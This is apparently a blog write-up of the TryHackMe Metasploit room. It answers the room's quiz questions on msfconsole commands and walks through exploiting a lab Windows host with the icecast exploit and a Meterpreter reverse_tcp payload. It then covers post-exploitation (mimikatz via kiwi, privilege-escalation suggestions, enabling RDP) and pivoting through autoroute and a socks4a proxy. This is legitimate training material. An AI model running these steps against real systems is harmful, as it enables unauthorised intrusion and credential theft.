---
layout: article
title:  "Metasploit -  TryHackMe"
date:   2020-12-04 01:30:53 +0  530
# categories: [writeup, tryhackme]
# category: writeup
tags:
  - writeup
  - tryhackme
  - metasploit
  - pentesting
  - windows
---

# Task 1 : Intro

install `metasploit` as instructed if it is not already present

# Task 2 : Initializing...

Intialize and start metasploit `sudo msfdb init && msfconsole` or just `msfconsole` if already initialized the database

- We can start the Metasploit console on the command line without showing the banner or any startup information as well. What switch do we add to msfconsole to start it without showing this information? This will include the '-'

    `-q`

![/assets/images/posts/rpmetasploit/Untitled.png](/assets/images/posts/rpmetasploit/Untitled.png)

- Cool! We've connected to the database, which type of database does Metasploit 5 use?

    `postgresql`

# Task 3 : Rock 'em to the Core [Commands]

In the `msf5>` prompt type `help` 

- The help menu has a very short one-character alias, what is it?

    `?`

- Finding various modules we have at our disposal within Metasploit is one of the most common commands we will leverage in the framework. What is the base command we use for searching?

    `search`

- Once we've found the module we want to leverage, what command we use to select it as the active module?

    `use`

- How about if we want to view information about either a specific module or just the active one we have selected?

    `info`

- Metasploit has a built-in netcat-like function where we can make a quick connection with a host simply to verify that we can 'talk' to it. What command is this?

    `connect`

- Entirely one of the commands purely utilized for fun, what command displays the motd/ascii art we see when we start msfconsole (without -q flag)?

    `banner`

- We'll revisit these next two commands shortly, however, they're two of the most used commands within Metasploit. First, what command do we use to change the value of a variable?

    `set`

- Metasploit supports the use of global variables, something which is incredibly useful when you're specifically focusing on a single box. What command changes the value of a variable globally?

    `setg`

- Now that we've learned how to change the value of variables, how do we view them? There are technically several answers to this question, however, I'm looking for a specific three-letter command which is used to view the value of single variables.

    `get`

- How about changing the value of a variable to null/no value?

    `unset`

- When performing a penetration test it's quite common to record your screen either for further review or for providing evidence of any actions taken. This is often coupled with the collection of console output to a file as it can be incredibly useful to grep for different pieces of information output to the screen. What command can we use to set our console output to save to a file?

    `spool`

- Leaving a Metasploit console running isn't always convenient and it can be helpful to have all of our previously set values load when starting up Metasploit. What command can we use to store the settings/active datastores from Metasploit to a settings file? This will save within your msf4 (or msf5) directory and can be undone easily by simply removing the created settings file.

    `save`

# Task 4 : Modules for Every Occasion!

- Easily the most common module utilized, which module holds all of the exploit code we will use?

    `exploit`

- Used hand in hand with exploits, which module contains the various bits of shellcode we send to have executed following exploitation?

    `payload`

- Which module is most commonly used in scanning and verification machines are exploitable? This is not the same as the actual exploitation of course.

    `auxiliary`

- One of the most common activities after exploitation is looting and pivoting. Which module provides these capabilities?

    `post`

- Commonly utilized in payload obfuscation, which module allows us to modify the 'appearance' of our exploit such that we may avoid signature detection?

    `encoder`

- Last but not least, which module is used with buffer overflow and ROP attacks?

    `nop`

- Not every module is loaded in by default, what command can we use to load different modules?

    `load`

# Task 5 : Move that shell!

let us scan the target with built-in `nmap` in `metasploit`

`db_nmap -sV <ip>`

![/assets/images/posts/rpmetasploit/Untitled%201.png](/assets/images/posts/rpmetasploit/Untitled%201.png)

- What service does nmap identify running on port 135?

    `msrpc`

![/assets/images/posts/rpmetasploit/Untitled%202.png](/assets/images/posts/rpmetasploit/Untitled%202.png)

- Now that we've scanned our victim system, let's try connecting to it with a Metasploit payload. First, we'll have to search for the target payload. In Metasploit 5 (the most recent version at the time of writing) you can simply type 'use' followed by a unique string found within only the target exploit. For example, try this out now with the following command 'use icecast'. What is the full path for our exploit that now appears on the msfconsole prompt? *This will include the exploit section at the start

    `exploit/windows/http/icecast_header`

![/assets/images/posts/rpmetasploit/Untitled%203.png](/assets/images/posts/rpmetasploit/Untitled%203.png)

We can use our search results without typing out the full name/path of the module we want to use as shown below

![/assets/images/posts/rpmetasploit/Untitled%204.png](/assets/images/posts/rpmetasploit/Untitled%204.png)

- What is the name of the column on the far left side of the console that shows up next to 'Name'?

    `#`

let's set the payload using this command `set PAYLOAD windows/meterpreter/reverse_tcp`

set the host ip `set LHOST <your-ip>`

ser the target ip `set RHOSTS <ip>`

select the previous exploit again `use icecast`

![/assets/images/posts/rpmetasploit/Untitled%205.png](/assets/images/posts/rpmetasploit/Untitled%205.png)

You can view the variable values using `options` command

![/assets/images/posts/rpmetasploit/Untitled%206.png](/assets/images/posts/rpmetasploit/Untitled%206.png)

You can list all sessions using `sessions`

![/assets/images/posts/rpmetasploit/Untitled%207.png](/assets/images/posts/rpmetasploit/Untitled%207.png)

Now, run the exploit using the command `exploit`

![/assets/images/posts/rpmetasploit/Untitled%208.png](/assets/images/posts/rpmetasploit/Untitled%208.png)

# Task 6 : We're in, now what?

![/assets/images/posts/rpmetasploit/Untitled%209.png](/assets/images/posts/rpmetasploit/Untitled%209.png)

![/assets/images/posts/rpmetasploit/Untitled%2010.png](/assets/images/posts/rpmetasploit/Untitled%2010.png)

![/assets/images/posts/rpmetasploit/Untitled%2011.png](/assets/images/posts/rpmetasploit/Untitled%2011.png)

- First things first, our initial shell/process typically isn't very stable. Let's go ahead and attempt to move to a different process. First, let's list the processes using the command 'ps'. What's the name of the spool service?

    `spoolsv.exe`

- Let's go ahead and move into the spool process or at least attempt to! What command do we use to transfer ourselves into the process? This won't work at the current time as we don't have sufficient privileges but we can still try!

    `migrate`

- Well that migration didn't work, let's find out some more information about the system so we can try to elevate. What command can we run to find out more information regarding the current user running the process we are in?

    `getuid`

- How about finding more information out about the system itself?

    `sysinfo`

- This might take a little bit of googling, what do we run to load mimikatz (more specifically the new version of mimikatz) so we can use it?

    `load kiwi`

- Let's go ahead and figure out the privileges of our current user, what command do we run?

    `getprivs`

- What command do we run to transfer files to our victim computer?

    `upload`

- How about if we want to run a Metasploit module?

    `run`

- A simple question but still quite necessary, what command do we run to figure out the networking information and interfaces on our victim?

    `ipconfig`

- Let's go ahead and run a few post modules from Metasploit. First, let's run the command `run post/windows/gather/checkvm`. This will determine if we're in a VM, a very useful piece of knowledge for further pivoting.

![/assets/images/posts/rpmetasploit/Untitled%2012.png](/assets/images/posts/rpmetasploit/Untitled%2012.png)

- Next, let's try: `run post/multi/recon/local_exploit_suggester`. This will check for various exploits which we can run within our session to elevate our privileges. Feel free to experiment using these suggestions, however, we'll be going through this in greater detail in the room `Ice`

    ![/assets/images/posts/rpmetasploit/Untitled%2013.png](/assets/images/posts/rpmetasploit/Untitled%2013.png)

- Finally, let's try forcing RDP to be available. This won't work since we aren't administrators, however, this is a fun command to know about: `run post/windows/manage/enable_rdp`
- One quick extra question, what command can we run in our meterpreter session to spawn a normal system shell?

    `shell`

# Task 7 : Makin' Cisco Proud

- Let's go ahead and run the command `run autoroute -h`, this will pull up the help menu for autoroute. What command do we run to add a route to the following subnet: 172.18.1.0/24? Use the -n flag in your answer.

    `run autoroute -s 172.18.1.0 -n 255.255.255.0`

- Additionally, we can start a socks4a proxy server out of this session. Background our current meterpreter session and run the command `search server/socks4a`. What is the full path to the socks4a auxiliary module?

    `auxiliary/server/socks4a`

- Once we've started a socks server we can modify our /etc/proxychains.conf file to include our new server. What command do we prefix our commands (outside of Metasploit) to run them through our socks4a server with proxychains?

    `proxychains`